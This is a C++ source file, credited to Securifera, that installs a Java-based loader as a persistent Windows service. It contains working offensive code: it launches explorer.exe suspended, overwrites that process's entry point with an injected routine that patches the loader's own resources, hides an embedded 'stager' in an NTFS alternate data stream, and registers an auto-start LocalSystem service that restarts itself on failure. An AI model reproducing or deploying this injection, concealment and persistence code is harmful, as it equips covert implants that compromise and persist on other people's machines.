//***************************************************************
/*  Author: Securifera
/   Description: 
/           This application sets up and runs the java application
/   as a service.
/
/   Revision History:
/           Fixed bug that was causing the service to close on 
/                logoff.  Added -Xrs option to jvm startup arguments.
/
/
/
*/
//****************************************************************

#pragma once

#include "svc.h"
#include "..\JAR_Loader\jarldr.h"
#include "..\log.h"
#include "..\utilities.h"

HANDLE stopEvent;
std::string javaPath = "";

#pragma pack(push, 1)

typedef void (CALLBACK *ULPWSO)(HANDLE,DWORD);
typedef void (CALLBACK *ULPCH)(HANDLE);
typedef void (CALLBACK *ULPEP)(UINT);

//Functions for write service name to resource
typedef HANDLE (CALLBACK *ULPBUP)(LPCSTR, BOOL);
typedef BOOL (CALLBACK *ULPUR)(HANDLE, LPCSTR, LPCSTR, WORD, LPVOID, DWORD);
typedef BOOL (CALLBACK *ULPEUR)(HANDLE, BOOL );

//
//	Structure to inject into remote process. Contains 
//  function pointers and code to execute.
//
typedef struct REMSTRUCT
{
	HANDLE	hParent;				// parent process handle

	ULPWSO	fnWaitForSingleObject;
	ULPCH	fnCloseHandle;
	ULPEP	fnExitProcess;

	ULPBUP  fnBeginUpdateResource;
	ULPUR   fnUpdateResource;
	ULPEUR  fnEndUpdateResource;
	
	TCHAR	szServiceName[MAX_PATH];// Service Name
	TCHAR	szFileName[MAX_PATH];	// file to update
	UINT    uiResId;
	UINT    uiTableSize;
	void	*szResStrTable;        // Was "char	szResStrTable[0];"

} REMSTRUCT;

#pragma pack(pop)

//
//	Routine to execute in remote process. 
//
static void Remote_Thread(){

	REMSTRUCT *remote = (REMSTRUCT *)0xdffddfdfd;   	// this will get replaced with a
             												// real pointer to the data when it
															// gets injected into the remote
															// process
	//
	// wait for parent process to terminate
	//
	// convert to C++ 
	// per http://support.microsoft.com/kb/117428
	remote->fnWaitForSingleObject(remote->hParent, INFINITE);
	
	//
	// Close the handle
	//
	remote->fnCloseHandle(remote->hParent);

	//Update the resource
	HANDLE hRes = remote->fnBeginUpdateResource( remote->szFileName, FALSE );
	if( remote->fnUpdateResource( hRes, RT_STRING, MAKEINTRESOURCE( remote->uiResId / 16 + 1),
					NULL, reinterpret_cast< void* >( remote->szResStrTable ),
					remote->uiTableSize ) == TRUE ){
			
	
		remote->fnEndUpdateResource( hRes, FALSE );
	}

	//Exit the process
	remote->fnExitProcess(0);
	
}

#pragma pack( push, 1 )


//==============================================================================================
// http://blogorama.nerdworks.in/comment.aspx?entryID=21
//
struct coff_header
{
    unsigned short machine;
    unsigned short sections;
    unsigned int timestamp;
    unsigned int symboltable;
    unsigned int symbols;
    unsigned short size_of_opt_header;
    unsigned short characteristics;
};

struct optional_header
{
    unsigned short magic;
    char linker_version_major;
    char linker_version_minor;
    unsigned int code_size;
    unsigned int idata_size;
    unsigned int udata_size;
    unsigned int entry_point;
    unsigned int code_base;
};

#pragma pack( pop )

//
// get the module address
//
char *module = (char *)GetModuleHandle( NULL );

//
// get the sig
//
int *offset = (int*)( module + 0x3c );
char *sig = module + *offset;

//
// get the coff header
//
coff_header *coff = (coff_header *)( sig + 4 );

//
// get the optional header
//
optional_header *opt = (optional_header *)( (char *)coff + sizeof( coff_header ) );

//
// get the entry point
//
char *entry_point = (char *)module + opt->entry_point;

//=========================================================================
/**
  Gets the address of the entry point routine given a
  handle to a process and its primary thread.
*/
SIZE_T GetProcessEntryPointAddress( HANDLE hProcess, HANDLE hThread ){

    CONTEXT             context;
	LDT_ENTRY           entry;
    TEB                 teb;
    PEB                 peb;
    SIZE_T              read;
    SIZE_T              dwFSBase;
    SIZE_T              dwImageBase;
    DWORD			    dwOffset;
    SIZE_T              dwOptHeaderOffset;
    optional_header     opt;

	PROCESS_BASIC_INFORMATION pbInfo;
	_NtQueryInformationProcess lpfnDLLProc;	

	if( IsWow64() ){

		//
		// get the current thread context
		//
		context.ContextFlags = CONTEXT_ALL;
		GetThreadContext( hThread, &context );
    
		//
		// use the segment register value to get a pointer to
		// the TEB
		//
		GetThreadSelectorEntry( hThread, context.SegFs, &entry );
		dwFSBase = ( entry.HighWord.Bits.BaseHi << 24 ) |
						 ( entry.HighWord.Bits.BaseMid << 16 ) |
						 ( entry.BaseLow );

		//
		// read the teb
		//
		ReadProcessMemory( hProcess, (LPCVOID)dwFSBase,
		                   &teb, sizeof( TEB ), &read );
		
		//
		// read the peb from the location pointed at by the teb
		//
		ReadProcessMemory( hProcess, (LPCVOID)teb.Peb,
		                   &peb, sizeof( PEB ), &read );

	} else {	
		
		lpfnDLLProc = (_NtQueryInformationProcess)GetProcAddress( GetModuleHandle("ntdll.dll"), "NtQueryInformationProcess");      
		(*lpfnDLLProc)( hProcess, 0, &pbInfo, sizeof(pbInfo), NULL );
	
		//dwImageBase = (SIZE_T)pbInfo.PebBaseAddress;

		//
		// read the peb from the location pointed at by the teb
		//
		ReadProcessMemory( hProcess, (LPCVOID)pbInfo.PebBaseAddress,
		                   &peb, sizeof( PEB ), &read );

	}

	dwImageBase = (SIZE_T)peb.ImageBaseAddress;
    
       
    //
    // figure out where the entry point is located;
    //
    ReadProcessMemory( hProcess, (LPCVOID)( dwImageBase + 0x3c ),
                       &dwOffset, sizeof( DWORD ), &read );
    
    dwOptHeaderOffset = ( dwImageBase + dwOffset + 4 + sizeof( coff_header ) );
    ReadProcessMemory( hProcess, (LPCVOID)dwOptHeaderOffset,
                       &opt, sizeof( optional_header ), &read );
    
    return ( dwImageBase + opt.entry_point );
}

//=========================================================================
//
//	Update the resource
//	
void UpdateResourceFile( std::string passedName, std::string javaPath ){

	STARTUPINFO			si = { sizeof(si) };
	PROCESS_INFORMATION pi;

	DWORD				oldProt;
	REMSTRUCT			local;
	SIZE_T				data;

	TCHAR				szExe[MAX_PATH] = "explorer.exe";
	SIZE_T				process_entry;

	//Get function pointer
	void (*myPtr)();
	myPtr = &Remote_Thread;
	
	//Find function length
	char bp[] = { '\xc3', '\xcc' };	
	char *fp = (char*)myPtr;
	while( memcmp( fp++, bp, 2) != 0);

	SIZE_T initialAddr =  (SIZE_T)&Remote_Thread;
	SIZE_T secondAddr = (SIZE_T)fp;
	unsigned int funcBytes = (unsigned int)(secondAddr - initialAddr);

	SIZE_T read;
	char *buffer = (char *)malloc(funcBytes);
	wchar_t *cpRes;
	ReadProcessMemory( GetCurrentProcess(), (LPCVOID)myPtr, buffer, funcBytes, &read );
	
	//Find function length
	DWORD minusOne = 0xdfedfcfd;
	char *fp2 = (char*)buffer;
	while( memcmp( fp2++, &minusOne, sizeof(DWORD)) != 0);

	//Get the index of the address to replace
	initialAddr =  (SIZE_T)buffer;
	secondAddr = (SIZE_T)fp2;
	unsigned int addrIndex = (unsigned int)((secondAddr - initialAddr) - 1 );

	std::string srvName; 
	//	Create executable suspended	
	if(CreateProcess(0, szExe, 0, 0, 0, CREATE_SUSPENDED|IDLE_PRIORITY_CLASS, 0, 0, &si, &pi)){

		local.fnWaitForSingleObject		= (ULPWSO)WaitForSingleObject;
		local.fnCloseHandle				= (ULPCH)CloseHandle;
		local.fnBeginUpdateResource		= (ULPBUP)BeginUpdateResource;
		local.fnUpdateResource			= (ULPUR)UpdateResource;
		local.fnExitProcess				= (ULPEP)ExitProcess;
		local.fnEndUpdateResource		= (ULPEUR)EndUpdateResource;
			
		//Get the service name
		ReadServiceName( &srvName );
		if( srvName.empty() ){
			Log("Unable to locate the service name entry.");
			return;
		}

		//Get the resource
		size_t length = 0;
		wchar_t wsrvName[ MAX_PATH];
		mbstowcs_s(&length, wsrvName, srvName.c_str(),  MAX_PATH);

		int index = -1;
		HRSRC hrsrc = FindResource(NULL, MAKEINTRESOURCE(IDS_NAME / 16 + 1), RT_STRING);
		if (hrsrc) {
		
			HGLOBAL hglob = LoadResource(NULL, hrsrc);
			if (hglob) {
			
				//Copy over the contents of the resource
				LPCWSTR pwsz = reinterpret_cast<LPCWSTR>(LockResource(hglob));
				DWORD resSize = SizeofResource(NULL, hrsrc);
				cpRes = (wchar_t*) malloc(resSize);
				memcpy(cpRes, pwsz, resSize);
		
				UnlockResource(pwsz);
				FreeResource(hglob);

				UpdateStringTableBuffer( &cpRes, IDS_NAME, const_cast<char*>(passedName.c_str()), &resSize );
				if( javaPath.length() > 0 ){
					UpdateStringTableBuffer( &cpRes, IDS_PATH, const_cast<char*>(javaPath.c_str()), &resSize );
				}

				//Set the size
				local.uiTableSize = resSize;
				local.uiResId = IDS_NAME;
		
				int structSize = sizeof( local );
				//
				// Give remote process a copy of our own process handle
				//
				DuplicateHandle(GetCurrentProcess(), GetCurrentProcess(), 
					pi.hProcess, &local.hParent, 0, FALSE, 0);

				//Set the bin name
				GetModuleFileName(0, local.szFileName, MAX_PATH);
		
				//
				// get the process's entry point address
				//
				process_entry = GetProcessEntryPointAddress( pi.hProcess, pi.hThread );

				//
				// replace the address of the data inside the
				//
				data = process_entry + funcBytes;
				//buffer[addrIndex + 3] = (char)( data >> 24 );
				//buffer[addrIndex + 2] = (char)( ( data >> 16 ) & 0xFF );
				//buffer[addrIndex + 1] = (char)( ( data >> 8 ) & 0xFF );
				//buffer[addrIndex] = (char)( data & 0xFF );
				for( int i=0; i < sizeof(data); i++ ){
					buffer[addrIndex + i] = (char)( ( data >> (8 * i)) & 0xFF );				
				}

				//
				// copy our code+data at the exe's entry-point
				//
				VirtualProtectEx( pi.hProcess, (PVOID)process_entry,
								  sizeof( local ) + funcBytes,
								  PAGE_EXECUTE_READWRITE,  &oldProt );
				WriteProcessMemory( pi.hProcess,(PVOID)process_entry,
									buffer,	funcBytes, 0);
				WriteProcessMemory( pi.hProcess,(PVOID)data,
									&local,	sizeof( local ), 0);

				//Write the last buffer
				WriteProcessMemory( pi.hProcess,(PVOID)(data + sizeof( local ) ),
									cpRes, resSize, 0);
				
				//
				// Let the process continue
				//
				ResumeThread(pi.hThread);
				CloseHandle(pi.hThread);
				CloseHandle(pi.hProcess);

				//Free the memory
				free(cpRes);
			}
		}

	}

	free(buffer);
	return;
}

//===================================================================
//
//	Updates the string for the passed id in the buffer with the passed string. 
//
void UpdateStringTableBuffer( wchar_t** buffer, UINT rsrcId, char * newString, DWORD *size ){
	
	//Get the old string
	char prevStr[MAX_PATH];
	LoadString(NULL, rsrcId, prevStr, MAX_PATH );	

	//Check if they are alread equal
	if( _stricmp(prevStr, newString) != 0 ){
	
		if ( *buffer ) {

			//Check if the buffer needs to be realloc-ed
			unsigned int oldStrLen = strlen(prevStr) * 2;
			unsigned int newStrLen = strlen(newString) * 2;

			//Allocate a temp buffer
			unsigned int tmpSize = *size - oldStrLen + newStrLen;
			wchar_t* tmpBuffer = (wchar_t*)malloc(tmpSize);
			wchar_t* tmpBuffer_start = tmpBuffer;

			//Get the string index
			unsigned int resId = (rsrcId % 16);

			//Convert strings to wcs
			size_t length = 0;
			wchar_t wnewName[ MAX_PATH ];
			mbstowcs_s( &length, wnewName, newString, MAX_PATH );

			// okay now walk the string table
			unsigned int stringLen = 0;
			wchar_t *tmpPtr = *buffer;
			__int16 stringLength;

			for (unsigned int i = 0; i < 16; i++) {
					
				//Check if it is the index passed
				if( i == resId ){

					//Get the string length
					stringLength = wcslen(wnewName);
					memcpy(tmpBuffer, &stringLength, 2);
					tmpBuffer++;
					tmpPtr++;

					//Copy the string
					memcpy(tmpBuffer, wnewName, stringLength * 2);
					tmpPtr += oldStrLen/2;
					tmpBuffer += stringLength;
				
				} else {

					//Get the length and add it to the tmp buffer
					stringLength = *tmpPtr;
					memcpy(tmpBuffer, &stringLength, 2);
					tmpPtr++;
					tmpBuffer++;
						
					if( stringLength > 0 ){				

						//Add the legth
					    memcpy(tmpBuffer, tmpPtr, stringLength * 2);
						tmpPtr += stringLength;
						tmpBuffer += stringLength;
					} 
				}
			}

			//Make sure the size is what was calculated
			unsigned int newSize = (unsigned int)((SIZE_T )tmpBuffer - (SIZE_T)tmpBuffer_start);

			//Reallocate to the new size and copy the data
			if( newSize == tmpSize ){
				*size = tmpSize;
				*buffer = (wchar_t *)realloc(*buffer, *size);
			    memcpy(*buffer,tmpBuffer_start, newSize);
			}

			free(tmpBuffer_start);
		}	
	}

}

//
//	The main entry point 
//
int main(int argc, char* argv[]){

	std::string serviceName;
	char serviceDescription[MAX_PATH] = "";
	bool install = false;
	char* option;
	
	if(argc == 1) {

		//Get the service name
	    ReadServiceName(&serviceName);

		//Log error
		if( serviceName.empty() ){
			Log("Unable to start service.  No service name.");
			return 1;
		}

		//Set the java path
		char javaPathArr[MAX_PATH] = "";
		ReadJavaPath(javaPathArr);
		if( javaPathArr == NULL || _stricmp(" ",javaPathArr) == 0 ){
			javaPath = std::string(JAVADIR);
		} else {
			javaPath = std::string(javaPathArr);
		}

		//Service Entry;
		SERVICE_TABLE_ENTRY	lpServiceStartTable[] = {
			{ (LPSTR)serviceName.c_str(), ServiceMain},
			{0, 0}
		};

		//Services.exe launches this process without any params
		if(!StartServiceCtrlDispatcher(lpServiceStartTable)) {
			Log("StartServiceCtrlDispatcher failure, error code = %d\n", GetLastError());
		}
		return 0;
	}

	for (int i = 1; i < argc; i++) { 

		option = argv[i];
		if(_stricmp("-i",option) == 0){
			//Install the service
            install = true;
		} else if(_stricmp("-n",option) == 0) {
			
			//Get the service name
			if (i + 1 != argc){
				serviceName.assign(argv[i + 1]);
				i++;
			}

        } else if(_stricmp("-d",option) == 0) {
			
			//Get the description
			if (i + 1 != argc){
				strcpy_s(serviceDescription, argv[i + 1]);
				i++;
			}
		} else if(_stricmp("-l",option) == 0) {
			
			//Get the service name
			ReadServiceName(&serviceName);
		
			//Set the java path
			char javaPathArr[MAX_PATH] = "";
			ReadJavaPath(javaPathArr);

			//Get the description
			printf_s("\nService Name:   %s\n", serviceName);
			printf_s("\nPath:  %s\n", javaPathArr);			
		
		} else if(_stricmp("-j",option) == 0) {
			
			//Get the description
			if (i + 1 != argc){
				javaPath = argv[i + 1];
				i++;
			}

        } else if(_stricmp("-u",option) == 0) {
			//Uninstall the service
            UnInstall();
			return 0;
        } else if(_stricmp("-h",option) == 0) {
			//Print help menu
            printf_s("\nUsage:   \"-i\"    Install\n");
			printf_s("               \"-n\"    Service Name (required)\n");
			printf_s("               \"-d\"    Service Description (optional)\n");
			printf_s("         \"-u\"    Uninstall\n");
			return 0;
        } else {
            printf_s("\nInvalid parameter %s\n", argv[i]);
			printf_s("Ensure that parameters with spaces are enclosed in quotes.\n\n");
		    printf_s("Usage:   \"-i\"    Install\n");
			printf_s("               \"-n\"    Service Name (required)\n");
			printf_s("               \"-d\"    Service Description (optional)\n");
			printf_s("         \"-u\"    Uninstall\n");
			return 1;
        }    
	}
	
	//Ensure all required options were provided
	if( install ){
	
		if( serviceName.empty() ){
			printf_s("Service name is required.  Aborting");		        
			return 1;
		}

		//Install in the registry
		Install( serviceName.c_str(), serviceDescription );

		//Update the string table with the service name
 		UpdateResourceFile( serviceName, javaPath );
	}

}

//=========================================================================
/**
	Extract the stager and write to ADS
*/
void ExtractStager( char* passedPath ){

    HGLOBAL hResourceLoaded;  // handle to loaded resource
    HRSRC   hRes;              // handle/ptr to res. info.
    char    *lpResLock;        // pointer to resource data
    DWORD   dwSizeRes;
    std::string strOutputLocation;
    std::string strAppLocation;
		
	//Get the resource
	hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_BIN1) ,"BIN");

    hResourceLoaded = LoadResource(NULL, hRes);
    lpResLock = (char *) LockResource(hResourceLoaded);
    dwSizeRes = SizeofResource(NULL, hRes);

	DWORD dwRet = 0;
	std::string classPath = passedPath;
	classPath.append(COLON);

	HANDLE hStream = CreateFile( classPath.c_str(), GENERIC_WRITE,
                             FILE_SHARE_WRITE, NULL,
                             OPEN_ALWAYS, 0, NULL );

    if( hStream != INVALID_HANDLE_VALUE ){
         WriteFile(hStream, lpResLock, dwSizeRes, &dwRet, NULL);
		CloseHandle(hStream);
	}

}

//=========================================================================
/**
	Attempt to get the service name embedded in the file
*/
void ReadServiceName( std::string* svcName ) {	
	char serviceName[MAX_PATH];
	LoadString(NULL, IDS_NAME, serviceName, MAX_PATH );	
	svcName->assign(serviceName);
}

//=========================================================================
/**
	Attempt to get the service name embedded in the file
*/
void ReadJavaPath( char* passedPath ) {	
	LoadString(NULL, IDS_PATH, passedPath, MAX_PATH );	
}


//=========================================================================
/**
	Installs the service
*/
void Install( const char* serviceName, char* serviceDesc ){

	char pPath[MAX_PATH];

	ZeroMemory(pPath, MAX_PATH);
	GetModuleFileName(NULL, pPath, MAX_PATH-1);
	SERVICE_DESCRIPTION sd;
	
	//Set the description
	sd.lpDescription = serviceDesc;
	SC_HANDLE schSCManager = OpenSCManager( NULL, NULL, SC_MANAGER_CREATE_SERVICE); 
	if (schSCManager==0) {
		printf_s("OpenSCManager failed, error code = %d\n", GetLastError());
	} else {
		SC_HANDLE schService = CreateService	( 
			schSCManager,	/* SCManager database      */ 
			serviceName,			/* name of service         */ 
			serviceName,			/* service name to display */ 
			SERVICE_ALL_ACCESS,        /* desired access          */ 
			SERVICE_WIN32_OWN_PROCESS, /* service type            */ 
			SERVICE_AUTO_START,      /* start type              */ 
			SERVICE_ERROR_NORMAL,      /* error control type      */ 
			pPath,			        /* service's binary        */ 
			NULL,                      /* no load ordering group  */ 
			NULL,                      /* no tag identifier       */ 
			NULL,                      /* no dependencies         */ 
			NULL,                      /* LocalSystem account     */ 
			NULL					/* no password             */ 
		);                     

		if (schService==0) {
			Log( "Create Service failure, error code = %d\n", GetLastError());
		} else {
			//Log( "Service %s installed\n", SERVICE_NAME);
			ChangeServiceConfig2(schService, SERVICE_CONFIG_DESCRIPTION, &sd);

			//Set an action for when it fails
			SERVICE_FAILURE_ACTIONS sfa;
			SC_ACTION failActions[3];

			failActions[0].Type = SC_ACTION_RESTART; //Failure action: Restart Service
			failActions[0].Delay = 60000; //number of seconds to wait before performing failure action, in milliseconds = 2minutes
			failActions[1].Type = SC_ACTION_RESTART;
			failActions[1].Delay = 60000;
			failActions[2].Type = SC_ACTION_NONE;
			failActions[2].Delay = 60000;

			sfa.dwResetPeriod = INFINITE;
			sfa.lpCommand = NULL;
			sfa.lpRebootMsg = NULL;
			sfa.cActions = 3;
			sfa.lpsaActions = failActions;

			ChangeServiceConfig2(schService, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa);
		}

		
		CloseServiceHandle(schSCManager);
	}	
}

//=========================================================================
/**
	Uninstalls the service
*/
void UnInstall(){

	std::string serviceName;

	//Get the service name
	ReadServiceName(&serviceName);

	SC_HANDLE schSCManager = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS); 
	if (schSCManager==0) {

		//printf_s( "OpenSCManager failed, error code = %d\n", GetLastError());

	} else {
		SC_HANDLE schService = OpenService( schSCManager, serviceName.c_str(), SERVICE_ALL_ACCESS);
		if (schService==0) {

			long nError = GetLastError();
			//printf_s("OpenService failed, error code = %d\n", nError);

		} else	{

			if(!DeleteService(schService)) {
				printf_s("Failed to delete service %s\n", serviceName);
			} else {
				printf_s("Service %s removed\n",serviceName);
			}
			CloseServiceHandle(schService); 
		}
		CloseServiceHandle(schSCManager);	
	}
	DeleteFile(LOG_FILE);
}

//=========================================================================
/**
	Service Main
*/
void WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv) {

	std::string serviceName;

	//Get the service name
	ReadServiceName(&serviceName);

	HANDLE handleArray[2];
	stopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	if(stopEvent == NULL) {
		Log("CreateEvent failed, error code = %d\n", GetLastError());
		return;
	}

	//Register Service Handler call back that responds start , stop commands 
    hServiceStatusHandle = RegisterServiceCtrlHandler(serviceName.c_str(), ServiceHandler); 
    if (hServiceStatusHandle==0) {
		Log("RegisterServiceCtrlHandler failed, error code = %d\n", GetLastError());
        return; 
    } 

	if(!SetTheServiceStatus(SERVICE_START_PENDING)) {
		return;
	}

	//Call the java class main method in a separate thread
	handleArray[0] = CreateThread( 
           NULL,              // default security attributes
           0,                 // use default stack size  
           InvokeMainWrapper,        // thread function 
           0,             // argument to thread function 
           0,                 // use default creation flags 
           0);   // returns the thread identifier 
	
	if(!SetTheServiceStatus(SERVICE_RUNNING)) {
		return;
	}

	//Wait for stopEvent
	//WaitForSingleObject(ahandle, INFINITE);

	handleArray[1] = stopEvent;
	WaitForMultipleObjects(2, handleArray, FALSE, INFINITE);
	
	if(!SetTheServiceStatus(SERVICE_STOPPED)) { 
		Log("SetServiceStatus failed, error code = %d\n", GetLastError());
	} 

	if(stopEvent != NULL) {
		CloseHandle(stopEvent);
	}
	
}

//=========================================================================
/**
	The service handler
*/
void WINAPI ServiceHandler(DWORD fdwControl) {
	HANDLE hThread;

	switch(fdwControl) 	{
		case SERVICE_CONTROL_STOP:
		case SERVICE_CONTROL_SHUTDOWN:
			//Create a separate shutdown thread and wait for the thread to 
			//gracefully shutdown with in a timeout of 20 seconds
			SetTheServiceStatus(SERVICE_STOP_PENDING);
			hThread = CreateThread( 
				NULL,              // default security attributes
				0,                 // use default stack size  
				InvokeShutdownWrapper,        // thread function 
				0,             // argument to thread function 
				0,                 // use default creation flags 
				0);   // returns the thread identifier 

			WaitForSingleObject(hThread, SHUTDOWN_TIMEOUT); 
			SetEvent(stopEvent);
			break; 
		case SERVICE_CONTROL_PAUSE:
			SetTheServiceStatus(SERVICE_PAUSED);
			break;
		default:
			SetTheServiceStatus(SERVICE_RUNNING);
			break;
	};
}

//=========================================================================
/**
	Main Java Entry Point
*/
DWORD WINAPI InvokeMainWrapper(LPVOID lpParam ) {
	
	std::string serviceName;

	//Get the service name
	ReadServiceName(&serviceName);

	char pPath[MAX_PATH];
	//Get the path to the binary
	ZeroMemory(pPath, MAX_PATH);
	GetModuleFileName(NULL, pPath, MAX_PATH-1);

	//Extract and write to ADS
	std::string adsPath;
	adsPath.assign(pPath);
	adsPath.append(COLON);

	//Check if the ADS exists
	DWORD fileAttr = GetFileAttributes(adsPath.c_str());
    if (0xFFFFFFFF == fileAttr)
        ExtractStager( pPath );

	//Call main
	if( !InvokeMain( &serviceName, adsPath ))
		SetEvent(stopEvent);

	return 0;

}

//=========================================================================
/**
	Shutdown method
*/
DWORD WINAPI InvokeShutdownWrapper( LPVOID lpParam ) {
    
	InvokeShutdown();

	return 0;
}

//=========================================================================
/**
	Sets the service status
*/
BOOL SetTheServiceStatus(DWORD dwStatus) {
    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP |  SERVICE_ACCEPT_SHUTDOWN /*| SERVICE_ACCEPT_PAUSE_CONTINUE*/; 
    ServiceStatus.dwWin32ExitCode      = 0; 
    ServiceStatus.dwServiceSpecificExitCode = 0; 
    ServiceStatus.dwCurrentState       = dwStatus; 
    ServiceStatus.dwCheckPoint         = 0; 
    ServiceStatus.dwWaitHint           = 0;  
    if(!SetServiceStatus(hServiceStatusHandle, &ServiceStatus)) { 
		Log("SetServiceStatus failure, error code = %d\n", GetLastError());
		return FALSE;
    } 
	return TRUE;
}
